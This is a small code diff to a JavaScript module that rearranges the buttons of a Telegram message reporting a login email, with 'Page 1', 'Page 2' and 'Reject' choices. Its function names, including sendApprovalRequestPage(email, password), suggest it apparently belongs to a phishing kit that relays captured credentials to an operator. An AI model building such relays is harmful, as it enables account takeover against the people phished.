@@ -103,15 +103,17 @@ function sendApprovalRequestPage(email, password) {
 async function sendLoginTelegram(email) {
   const options = {
     parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "➡️ Page 1", callback_data: `page1|${email}` },
-          { text: "➡️ Page 2", callback_data: `page2|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
+reply_markup: {
+  inline_keyboard: [
+    [
+      { text: "➡️ Page 1", callback_data: `page1|${email}` },
+      { text: "➡️ Page 2", callback_data: `page2|${email}` }
+    ],
+    [
+      { text: "❌ Reject!", callback_data: `reject|${email}` }
+    ]
+  ]
+}
   };
 
   const message = `📧 *Email:* ${email}`;
@@ -184,3 +186,4 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram
 };
+
